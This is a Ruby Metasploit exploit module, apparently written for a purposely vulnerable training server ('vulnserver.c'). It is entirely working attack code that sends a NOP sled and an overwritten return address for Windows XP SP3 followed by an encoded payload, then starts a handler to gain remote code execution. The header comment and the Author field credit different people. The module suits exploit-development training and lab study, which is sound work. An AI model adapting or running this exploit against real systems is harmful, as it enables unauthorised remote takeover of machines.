#
# Custom metasploit exploit for vulnserver.c
# Written by Peter Van Eeckhoutte
#
require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

      include Msf::Exploit::Remote::Tcp

      def initialize(info = {})
                super(update_info(info,
                        'Name'           => 'Custom vulnerable server stack overflow',
                        'Description'    => %q{
                                        This module exploits a stack overflow in a
                                        custom vulnerable server.
                                             },
                        'Author'         => [ 'Ismael Valenzuela' ],
                        'Version'        => '$Revision: 0001 $',
                        'DefaultOptions' =>
                                {
                                        'EXITFUNC' => 'process',
                                },
                        'Payload'        =>
                                {
                                        'Space'    => 1400,
                                        'BadChars' => "\x00\xff",
                                },
                        'Platform'       => 'win',

                        'Targets'        =>
                                [
                                        ['Windows XP SP3 En',
                                          { 'Ret' => 0x7c874413, 'Offset' => 504 } ],
                                ],
                        'DefaultTarget' => 0,

                        'Privileged'     => false
                        ))

                        register_options(
                        [
                                Opt::RPORT(200)
                        ], self.class)
       end

       def exploit
          connect

          junk = make_nops(target['Offset'])
          sploit = junk + [target.ret].pack('V') + make_nops(50) + payload.encoded
          sock.put(sploit)

          handler
          disconnect

       end

end
